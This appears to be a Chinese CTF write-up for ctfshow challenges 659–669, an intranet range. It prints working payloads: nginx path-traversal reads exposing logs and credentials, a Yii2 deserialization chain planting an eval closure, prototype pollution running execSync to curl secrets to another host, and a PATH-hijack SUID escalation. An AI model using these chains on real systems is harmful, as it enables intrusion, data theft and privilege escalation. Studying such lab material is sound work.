echo shell_exec('a=TyUzQTMyJTNBJTIyQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTIyJTNBMiUzQSU3QnMlM0E5JTNBJTIyJTAwJTJBJTAwb3V0cHV0JTIyJTNCTyUzQTIyJTNBJTIyRmFrZXIlNUNEZWZhdWx0R2VuZXJhdG9yJTIyJTNBMSUzQSU3QnMlM0ExMCUzQSUyMiUwMCUyQSUwMGRlZmF1bHQlMjIlM0JzJTNBNSUzQSUyMmpva2VyJTIyJTNCJTdEcyUzQTQzJTNBJTIyJTAwQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTAwcHJvY2Vzc2VzJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCTyUzQTI4JTNBJTIyR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMjIlM0EyJTNBJTdCcyUzQTM3JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzdHJlYW1zJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyOSUzQSUyMkd1enpsZUh0dHAlNUNQc3I3JTVDQ2FjaGluZ1N0cmVhbSUyMiUzQTIlM0ElN0JzJTNBNDMlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q0NhY2hpbmdTdHJlYW0lMDByZW1vdGVTdHJlYW0lMjIlM0JPJTNBMjIlM0ElMjJGYWtlciU1Q0RlZmF1bHRHZW5lcmF0b3IlMjIlM0ExJTNBJTdCcyUzQTEwJTNBJTIyJTAwJTJBJTAwZGVmYXVsdCUyMiUzQmIlM0EwJTNCJTdEcyUzQTYlM0ElMjJzdHJlYW0lMjIlM0JPJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0EzJTNBJTdCcyUzQTM0JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNQdW1wU3RyZWFtJTAwc291cmNlJTIyJTNCQyUzQTMyJTNBJTIyT3BpcyU1Q0Nsb3N1cmUlNUNTZXJpYWxpemFibGVDbG9zdXJlJTIyJTNBMTgzJTNBJTdCYSUzQTUlM0ElN0JzJTNBMyUzQSUyMnVzZSUyMiUzQmElM0EwJTNBJTdCJTdEcyUzQTglM0ElMjJmdW5jdGlvbiUyMiUzQnMlM0EyOCUzQSUyMmZ1bmN0aW9uJTI4JTI5JTdCZXZhbCUyOCUyNF9QT1NUJTVCMSU1RCUyOSUzQiU3RCUyMiUzQnMlM0E1JTNBJTIyc2NvcGUlMjIlM0JzJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0JzJTNBNCUzQSUyMnRoaXMlMjIlM0JOJTNCcyUzQTQlM0ElMjJzZWxmJTIyJTNCcyUzQTMyJTNBJTIyMDAwMDAwMDAyOTUxNDVkZTAwMDAwMDAwMDZlOWY1OTElMjIlM0IlN0QlN0RzJTNBMzIlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMDBzaXplJTIyJTNCaSUzQS0xMCUzQnMlM0EzNCUzQSUyMiUwMEd1enpsZUh0dHAlNUNQc3I3JTVDUHVtcFN0cmVhbSUwMGJ1ZmZlciUyMiUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCcyUzQTElM0ElMjJqJTIyJTNCJTdEJTdEJTdEJTdEcyUzQTM4JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzZWVrYWJsZSUyMiUzQmIlM0ExJTNCJTdEJTdEJTdEJTdE;
b=aW5jbHVkZSgkX1BPU1RbMl0pOwo=;
curl "172.2.133.5:8888/index.php?r=site/unserialize%26key=flag_663=ctfshow\{fa5cc1fb0bfc986d1ef150269c0de197\}"  -d "_csrf=a_NNxLPrVGtxteT6o7pCERw2sYqscNEGH2iLxPyQTAYtoA-OnogXHDbfio7GyXUnX0frsvQBqDAuXsy9kfQePw==" -d "UnserializeForm[ctfshowUnserializeData]=`echo "$a" | base64 -d`" -d "1=`echo "$b" | base64 -d`phpinfo();" -d "2=php://filter/convert.base64-encode/resource=/var/www/html/flag.php"
');
```

![](https://s2.loli.net/2021/12/14/Av2LOmZGTo136at.png)





## 659、660、661

nginx目录穿越漏洞，想到之前扫出来的那个`/public`

![](https://s2.loli.net/2021/12/13/nik6emFg4HhXMtZ.png)





659

```
curl 172.2.119.5/public../FLAG/flag659.txt
```

661

```
curl 172.2.119.5/public../home/flag/secret.txt
```

660会传到session里，可以读一下nginx的日志：

```
curl 172.2.119.5/public../var/log/nginx/ctfshow_web_access_log_file_you_never_know.log
```

![](https://s2.loli.net/2021/12/15/eQKjuOFogVvmaT5.jpg)

同时得到了登录的帐号密码：`admin/nE7jA5m`



还有他的配置文件看看还开了哪些网站服务：

```
curl 172.2.119.5/public../etc/nginx/nginx.conf
```

```conf
daemon off;

worker_processes  auto;

error_log  /var/log/nginx/ctfshow_web_error_log_file_you_never_know.log warn;


events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;
    log_format  main  '[$time_local]:$remote_addr-$request-$status';
    access_log /var/log/nginx/ctfshow_web_access_log_file_you_never_know.log main;
    server {
        listen       80;
        server_name  localhost;
        root         /var/www/html;
        index index.php;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        location /public {
            autoindex on;
            alias /public/;
        }

        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            include        fastcgi_params;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        }

    }

    server {
        listen       8888;
        server_name  oa;
        root         /var/oa/web;
        index index.php;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        location /{
            index index.php;
            autoindex off;

        }

       location ~ \.php$ {
            try_files $uri =404;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            include        fastcgi_params;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        }
    }
}
```



## 662、663



663信息：

```
curl 172.2.119.5/public../home/www-data/creater.sh
```

```sh
#!/bin/sh

file=`echo $RANDOM|md5sum|cut -c 1-3`.html
echo 'flag_663=ctfshow{xxxx}' > /var/www/html/$file
```

把663的flag生成到`/var/www/html`下的html里，文件名是随机三位，爆破一下

不过为什么是662。。。

![](https://s2.loli.net/2021/12/15/boSY9GuKpgz5hyq.jpg)

在664需要663的flag，试了一下这个，，发现可用，原来二者是同一个hh

## 664

```
curl 172.2.119.5/public../var/oa/
```

存在flag664.php

![](https://s2.loli.net/2021/12/13/wynbNJz1UCADKlF.png)



在nginx查到服务端口是8888，访问之：

![](https://s2.loli.net/2022/07/20/G3SaZpdXYO4PHM5.png)

yii框架，有个反序列化~

随便传了一下

```
curl -d "_csrf=JZ82CCjQXxEmCzTOqGRBIKbh9-eCBySbUZGw7SM4RvAX8V19f48uQVJ6WouQNyZ_xK2kouZ0RqsUx8TYF18MtQ==" -d "UnserializeForm[ctfshowUnserializeData]=aaaaa" "172.2.78.5:8888/index.php?r=site/unserialize"
```

需要663的flag作key才行

![](https://s2.loli.net/2021/12/13/2aOrs7xVF3wLtqW.png)

```
1=echo `curl -d "_csrf=JZ82CCjQXxEmCzTOqGRBIKbh9-eCBySbUZGw7SM4RvAX8V19f48uQVJ6WouQNyZ_xK2kouZ0RqsUx8TYF18MtQ==" -d "UnserializeForm[ctfshowUnserializeData]=反序列化数据" "172.2.78.5:8888/index.php?r=site/unserialize%26key=flag_663=ctfshow{fa5cc1fb0bfc986d1ef150269c0de197}"`;
```

### 636、637、638、639

正好平台有yii的专题，学习了一波

学习文章：

[奇安信攻防社区-Yii2.0.42反序列化分析(一) (butian.net)](https://forum.butian.net/share/666)

[奇安信攻防社区-Yii2.0.42反序列化分析(二) (butian.net)](https://forum.butian.net/share/734)

要注意的是后面两个链子需要：[opis/closure: Serialize closures (anonymous functions) (github.com)](https://github.com/opis/closure)

这里用的是第四个链子：

```php
<?php
/***
 * Created by joker
 * Date 2021/9/19 18:01
 ***/
namespace Codeception\Extension;
use Faker\DefaultGenerator;
use GuzzleHttp\Psr7\AppendStream;
class  RunProcess{
    protected $output;
    private $processes = [];
    public function __construct(){
        $this->processes[]=new DefaultGenerator(new AppendStream());
        $this->output=new DefaultGenerator('joker');
    }
}
namespace Faker;
class DefaultGenerator
{
    protected $default;
    public function __construct($default = null)
    {
        $this->default = $default;
    }
}
namespace GuzzleHttp\Psr7;
use Codeception\Extension\RunProcess;
use Faker\DefaultGenerator;
final class AppendStream{
    private $streams = [];
    private $seekable = true;
    public function __construct(){
        $this->streams[]=new CachingStream();
    }
}
final class CachingStream{
    private $remoteStream;
    public function __construct(){
        $this->remoteStream=new DefaultGenerator(false);
        $this->stream=new  PumpStream();
    }
}
final class PumpStream{
    private $source;
    private $size=-10;
    private $buffer;
    public function __construct(){
        $this->buffer=new DefaultGenerator('j');
        include("C:\\Users\\11634\\Desktop\\closure-master\\autoload.php");
        $a = function(){eval($_POST[1]);};
        $a = \Opis\Closure\serialize($a);
        $b = unserialize($a);
        $this->source=$b;
    }
}
$a = new RunProcess();
echo urlencode(serialize($a));
```

然后就能rce了：

![](https://s2.loli.net/2021/12/14/2cJ9CMir5RmoPZ8.png)



在终极考核这碰到了问题-，就是传参的时候，因为是通过第一台跳板机curl来传参，curl本身是没问题的；问题出在php执行系统命令时如果检测到空字节就会报错。

这里就着传参问题问了一下g4师傅，可以尝试把命令base64编码一下

经过尝试，可以像这样整：

```
echo shell_exec('`echo bHMK | base64 -d`');
```

但还是不太方便操作，就想着只编码反序列化数据那部分

尝试使用系统变量，像这样：

```
a=MTIzCg==; curl 10.1.125.120/mytest/test2.php -d "a=`echo "$a" | base64 -d`"
```

![](https://s2.loli.net/2022/07/20/WYeBRtEjIcV2val.png)



（注意{}要加上转义符\，不然就无法触发反序列化了）

```
1=
echo shell_exec('a=TyUzQTMyJTNBJTIyQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTIyJTNBMiUzQSU3QnMlM0E5JTNBJTIyJTAwJTJBJTAwb3V0cHV0JTIyJTNCTyUzQTIyJTNBJTIyRmFrZXIlNUNEZWZhdWx0R2VuZXJhdG9yJTIyJTNBMSUzQSU3QnMlM0ExMCUzQSUyMiUwMCUyQSUwMGRlZmF1bHQlMjIlM0JzJTNBNSUzQSUyMmpva2VyJTIyJTNCJTdEcyUzQTQzJTNBJTIyJTAwQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTAwcHJvY2Vzc2VzJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCTyUzQTI4JTNBJTIyR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMjIlM0EyJTNBJTdCcyUzQTM3JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzdHJlYW1zJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyOSUzQSUyMkd1enpsZUh0dHAlNUNQc3I3JTVDQ2FjaGluZ1N0cmVhbSUyMiUzQTIlM0ElN0JzJTNBNDMlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q0NhY2hpbmdTdHJlYW0lMDByZW1vdGVTdHJlYW0lMjIlM0JPJTNBMjIlM0ElMjJGYWtlciU1Q0RlZmF1bHRHZW5lcmF0b3IlMjIlM0ExJTNBJTdCcyUzQTEwJTNBJTIyJTAwJTJBJTAwZGVmYXVsdCUyMiUzQmIlM0EwJTNCJTdEcyUzQTYlM0ElMjJzdHJlYW0lMjIlM0JPJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0EzJTNBJTdCcyUzQTM0JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNQdW1wU3RyZWFtJTAwc291cmNlJTIyJTNCQyUzQTMyJTNBJTIyT3BpcyU1Q0Nsb3N1cmUlNUNTZXJpYWxpemFibGVDbG9zdXJlJTIyJTNBMTgzJTNBJTdCYSUzQTUlM0ElN0JzJTNBMyUzQSUyMnVzZSUyMiUzQmElM0EwJTNBJTdCJTdEcyUzQTglM0ElMjJmdW5jdGlvbiUyMiUzQnMlM0EyOCUzQSUyMmZ1bmN0aW9uJTI4JTI5JTdCZXZhbCUyOCUyNF9QT1NUJTVCMSU1RCUyOSUzQiU3RCUyMiUzQnMlM0E1JTNBJTIyc2NvcGUlMjIlM0JzJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0JzJTNBNCUzQSUyMnRoaXMlMjIlM0JOJTNCcyUzQTQlM0ElMjJzZWxmJTIyJTNCcyUzQTMyJTNBJTIyMDAwMDAwMDAyOTUxNDVkZTAwMDAwMDAwMDZlOWY1OTElMjIlM0IlN0QlN0RzJTNBMzIlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMDBzaXplJTIyJTNCaSUzQS0xMCUzQnMlM0EzNCUzQSUyMiUwMEd1enpsZUh0dHAlNUNQc3I3JTVDUHVtcFN0cmVhbSUwMGJ1ZmZlciUyMiUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCcyUzQTElM0ElMjJqJTIyJTNCJTdEJTdEJTdEJTdEcyUzQTM4JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzZWVrYWJsZSUyMiUzQmIlM0ExJTNCJTdEJTdEJTdEJTdE;
curl "172.2.133.5:8888/index.php?r=site/unserialize%26key=flag_663=ctfshow\{fa5cc1fb0bfc986d1ef150269c0de197\}"  -d "_csrf=a_NNxLPrVGtxteT6o7pCERw2sYqscNEGH2iLxPyQTAYtoA-OnogXHDbfio7GyXUnX0frsvQBqDAuXsy9kfQePw==" -d "UnserializeForm[ctfshowUnserializeData]=`echo "$a" | base64 -d`" -d "1=phpinfo();"
');
```

可以完美避免引号的问题~，终于打通了！！！！
![](https://s2.loli.net/2021/12/14/CgSflqJxU1zN6oQ.png)

伪协议读flag664.php源码：

```
1=
echo shell_exec('a=TyUzQTMyJTNBJTIyQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTIyJTNBMiUzQSU3QnMlM0E5JTNBJTIyJTAwJTJBJTAwb3V0cHV0JTIyJTNCTyUzQTIyJTNBJTIyRmFrZXIlNUNEZWZhdWx0R2VuZXJhdG9yJTIyJTNBMSUzQSU3QnMlM0ExMCUzQSUyMiUwMCUyQSUwMGRlZmF1bHQlMjIlM0JzJTNBNSUzQSUyMmpva2VyJTIyJTNCJTdEcyUzQTQzJTNBJTIyJTAwQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTAwcHJvY2Vzc2VzJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCTyUzQTI4JTNBJTIyR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMjIlM0EyJTNBJTdCcyUzQTM3JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzdHJlYW1zJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyOSUzQSUyMkd1enpsZUh0dHAlNUNQc3I3JTVDQ2FjaGluZ1N0cmVhbSUyMiUzQTIlM0ElN0JzJTNBNDMlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q0NhY2hpbmdTdHJlYW0lMDByZW1vdGVTdHJlYW0lMjIlM0JPJTNBMjIlM0ElMjJGYWtlciU1Q0RlZmF1bHRHZW5lcmF0b3IlMjIlM0ExJTNBJTdCcyUzQTEwJTNBJTIyJTAwJTJBJTAwZGVmYXVsdCUyMiUzQmIlM0EwJTNCJTdEcyUzQTYlM0ElMjJzdHJlYW0lMjIlM0JPJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0EzJTNBJTdCcyUzQTM0JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNQdW1wU3RyZWFtJTAwc291cmNlJTIyJTNCQyUzQTMyJTNBJTIyT3BpcyU1Q0Nsb3N1cmUlNUNTZXJpYWxpemFibGVDbG9zdXJlJTIyJTNBMTgzJTNBJTdCYSUzQTUlM0ElN0JzJTNBMyUzQSUyMnVzZSUyMiUzQmElM0EwJTNBJTdCJTdEcyUzQTglM0ElMjJmdW5jdGlvbiUyMiUzQnMlM0EyOCUzQSUyMmZ1bmN0aW9uJTI4JTI5JTdCZXZhbCUyOCUyNF9QT1NUJTVCMSU1RCUyOSUzQiU3RCUyMiUzQnMlM0E1JTNBJTIyc2NvcGUlMjIlM0JzJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0JzJTNBNCUzQSUyMnRoaXMlMjIlM0JOJTNCcyUzQTQlM0ElMjJzZWxmJTIyJTNCcyUzQTMyJTNBJTIyMDAwMDAwMDAyOTUxNDVkZTAwMDAwMDAwMDZlOWY1OTElMjIlM0IlN0QlN0RzJTNBMzIlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMDBzaXplJTIyJTNCaSUzQS0xMCUzQnMlM0EzNCUzQSUyMiUwMEd1enpsZUh0dHAlNUNQc3I3JTVDUHVtcFN0cmVhbSUwMGJ1ZmZlciUyMiUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCcyUzQTElM0ElMjJqJTIyJTNCJTdEJTdEJTdEJTdEcyUzQTM4JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzZWVrYWJsZSUyMiUzQmIlM0ExJTNCJTdEJTdEJTdEJTdE;
b=aW5jbHVkZSgicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0uLi9mbGFnNjY0LnBocCIpOwo=;
curl "172.2.133.5:8888/index.php?r=site/unserialize%26key=flag_663=ctfshow\{fa5cc1fb0bfc986d1ef150269c0de197\}"  -d "_csrf=a_NNxLPrVGtxteT6o7pCERw2sYqscNEGH2iLxPyQTAYtoA-OnogXHDbfio7GyXUnX0frsvQBqDAuXsy9kfQePw==" -d "UnserializeForm[ctfshowUnserializeData]=`echo "$a" | base64 -d`" -d "1=`echo "$b" | base64 -d`phpinfo();"
');
```

![](https://s2.loli.net/2021/12/14/P58MuQnopLdTivj.png)





## 665

![](https://s2.loli.net/2021/12/13/nik6emFg4HhXMtZ.png)

把getflag下下来，丢ida里看看：

![](https://s2.loli.net/2021/12/13/K7abnLSPZ8ApgVm.png)

应该是后面留着提权的提权，然后获得flag665内容
不过之前已经用nginx目录穿越拿到了：

665

```
curl 172.2.119.5/public../FLAG665
```

## 666



一开始没找到,

猜测是在数据库里，引用一下数据库文件：

```
include '/var/www/html/dbutil.php';
$ret=db::query($_POST[2]);
var_dump($ret);
```

```
1=
echo shell_exec('a=TyUzQTMyJTNBJTIyQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTIyJTNBMiUzQSU3QnMlM0E5JTNBJTIyJTAwJTJBJTAwb3V0cHV0JTIyJTNCTyUzQTIyJTNBJTIyRmFrZXIlNUNEZWZhdWx0R2VuZXJhdG9yJTIyJTNBMSUzQSU3QnMlM0ExMCUzQSUyMiUwMCUyQSUwMGRlZmF1bHQlMjIlM0JzJTNBNSUzQSUyMmpva2VyJTIyJTNCJTdEcyUzQTQzJTNBJTIyJTAwQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTAwcHJvY2Vzc2VzJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCTyUzQTI4JTNBJTIyR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMjIlM0EyJTNBJTdCcyUzQTM3JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzdHJlYW1zJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyOSUzQSUyMkd1enpsZUh0dHAlNUNQc3I3JTVDQ2FjaGluZ1N0cmVhbSUyMiUzQTIlM0ElN0JzJTNBNDMlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q0NhY2hpbmdTdHJlYW0lMDByZW1vdGVTdHJlYW0lMjIlM0JPJTNBMjIlM0ElMjJGYWtlciU1Q0RlZmF1bHRHZW5lcmF0b3IlMjIlM0ExJTNBJTdCcyUzQTEwJTNBJTIyJTAwJTJBJTAwZGVmYXVsdCUyMiUzQmIlM0EwJTNCJTdEcyUzQTYlM0ElMjJzdHJlYW0lMjIlM0JPJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0EzJTNBJTdCcyUzQTM0JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNQdW1wU3RyZWFtJTAwc291cmNlJTIyJTNCQyUzQTMyJTNBJTIyT3BpcyU1Q0Nsb3N1cmUlNUNTZXJpYWxpemFibGVDbG9zdXJlJTIyJTNBMTgzJTNBJTdCYSUzQTUlM0ElN0JzJTNBMyUzQSUyMnVzZSUyMiUzQmElM0EwJTNBJTdCJTdEcyUzQTglM0ElMjJmdW5jdGlvbiUyMiUzQnMlM0EyOCUzQSUyMmZ1bmN0aW9uJTI4JTI5JTdCZXZhbCUyOCUyNF9QT1NUJTVCMSU1RCUyOSUzQiU3RCUyMiUzQnMlM0E1JTNBJTIyc2NvcGUlMjIlM0JzJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0JzJTNBNCUzQSUyMnRoaXMlMjIlM0JOJTNCcyUzQTQlM0ElMjJzZWxmJTIyJTNCcyUzQTMyJTNBJTIyMDAwMDAwMDAyOTUxNDVkZTAwMDAwMDAwMDZlOWY1OTElMjIlM0IlN0QlN0RzJTNBMzIlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMDBzaXplJTIyJTNCaSUzQS0xMCUzQnMlM0EzNCUzQSUyMiUwMEd1enpsZUh0dHAlNUNQc3I3JTVDUHVtcFN0cmVhbSUwMGJ1ZmZlciUyMiUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCcyUzQTElM0ElMjJqJTIyJTNCJTdEJTdEJTdEJTdEcyUzQTM4JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzZWVrYWJsZSUyMiUzQmIlM0ExJTNCJTdEJTdEJTdEJTdE;
b=aW5jbHVkZSAnL3Zhci93d3cvaHRtbC9kYnV0aWwucGhwJzsNCiRyZXQ9ZGI6OnF1ZXJ5KCRfUE9TVFsyXSk7DQp2YXJfZHVtcCgkcmV0KTs=;
curl "172.2.133.5:8888/index.php?r=site/unserialize%26key=flag_663=ctfshow\{fa5cc1fb0bfc986d1ef150269c0de197\}"  -d "_csrf=a_NNxLPrVGtxteT6o7pCERw2sYqscNEGH2iLxPyQTAYtoA-OnogXHDbfio7GyXUnX0frsvQBqDAuXsy9kfQePw==" -d "UnserializeForm[ctfshowUnserializeData]=`echo "$a" | base64 -d`" -d "1=`echo "$b" | base64 -d`phpinfo();" -d "2=select * from ctfshow_secret;"
');
```

确实在

![](https://s2.loli.net/2021/12/15/acr39h6t4EKSnuM.jpg)

## 667

之前nginx看目录的时候看到/home目录下有node，尝试访问3000端口

![](https://s2.loli.net/2021/12/15/59SiCRxYEe7aLT6.jpg)



## 668

> hint: `/login`
>
> ```js
> utils.copy(user.userinfo,req.body);
> ```
>
> ```js
> function copy(object1, object2){
>  for (let key in object2) {
>      if (key in object2 && key in object1) {
>          copy(object1[key], object2[key])
>      } else {
>          object1[key] = object2[key]
>      }
>  }
> }
> ```



有点眼熟，感觉像之前做过的nodejs部分的

但是这里反弹shell的话只能弹到第一台机子，

第一台机子的busybox是带有nc的，但是不出网而且只开80，差点又在这整半天了

想到他有个日志，可以尝试curl他带过去

```
1=echo `curl 172.2.105.5/public..//var/log/nginx/ctfshow_web_access_log_file_you_never_know.log`;
```

payload：(要注意修改ip~)

```
{"__proto__":{"__proto__":{"compileDebug":1,"type":"Code","self":1,"line":"global.process.mainModule.require('child_process').execSync('bash -c \"curl 172.2.239.5/index.php?u=`cat ./secret.txt`\"')"}}}

1=echo shell_exec('a=eyJfX3Byb3RvX18iOnsiX19wcm90b19fIjp7ImNvbXBpbGVEZWJ1ZyI6MSwidHlwZSI6IkNvZGUiLCJzZWxmIjoxLCJsaW5lIjoiZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2Jhc2ggLWMgXCJjdXJsIDE3Mi4yLjIzOS41L2luZGV4LnBocD91PWBjYXQgLi9zZWNyZXQudHh0YFwiJykifX19;
curl "172.2.239.5:3000/login" -H "Content-Type: application/json" -d "`echo "$a" | base64 -d`"');
```

![](https://s2.loli.net/2021/12/14/aUqozyTsOHPSgdp.png)



最终：

![](https://s2.loli.net/2021/12/15/CPjfdy2RJYlAhiQ.jpg)


## 669

虽然没到，但应该是利用根目录下的那个getflag提权，进root目录下

![](https://s2.loli.net/2021/12/13/K7abnLSPZ8ApgVm.png)



```sh
# 查找具有suid权限的命令：
find / -user root -perm -4000 -print 2>/dev/null
```

虽然猜测getflag就是有这个权限的，但稳妥起见

但因为输出结果是多行的，可以用sed命令将多行显示为1行，也可以用grep

```
sed -e ':a;N;s/\n//;ta'
```

```
find / -user root -perm -4000 -print 2>/dev/null | grep | getflag
```

![](https://s2.loli.net/2021/12/15/TkBG3CJ9ZcAfxHS.png)



将getflag和FLAG665拷到第一台机子模拟一下操作，可以成功提权：

（网站权限所有者理所当然对网站目录有所有权限，因此可以chmod777）

```
echo 'ls /root/' > cat && chmod 777 cat && export PATH=.:$PATH && /getflag
```

那么就是把payload打过去了，要注意构造json语法。。，当然也可以尝试base64

```
1、将命令base64
curl 172.2.29.5/index.php?u=`echo ls /root/ > cat && chmod 777 cat && export PATH=.:$PATH && /getflag`

2、将结果外带即可
{"__proto__":{"__proto__":{"compileDebug":1,"type":"Code","self":1,"line":"global.process.mainModule.require('child_process').execSync('eval `echo Y3VybCAxNzIuMi4yOS41L2luZGV4LnBocD91PWBlY2hvIGxzIC9yb290LyA+IGNhdCAmJiBjaG1vZCA3NzcgY2F0ICYmIGV4cG9ydCBQQVRIPS46JFBBVEggJiYgL2dldGZsYWdg | base64 -d`')"}}}

3、传入
1=echo shell_exec('a=eyJfX3Byb3RvX18iOnsiX19wcm90b19fIjp7ImNvbXBpbGVEZWJ1ZyI6MSwidHlwZSI6IkNvZGUiLCJzZWxmIjoxLCJsaW5lIjoiZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2V2YWwgYGVjaG8gWTNWeWJDQXhOekl1TWk0eU9TNDFMMmx1WkdWNExuQm9jRDkxUFdCbFkyaHZJR3h6SUM5eWIyOTBMeUErSUdOaGRDQW1KaUJqYUcxdlpDQTNOemNnWTJGMElDWW1JR1Y0Y0c5eWRDQlFRVlJJUFM0NkpGQkJWRWdnSmlZZ0wyZGxkR1pzWVdkZyB8IGJhc2U2NCAtZGAnKSJ9fX0=;
curl "172.2.29.5:3000/login" -H "Content-Type: application/json" -d "`echo "$a" | base64 -d`"');
```
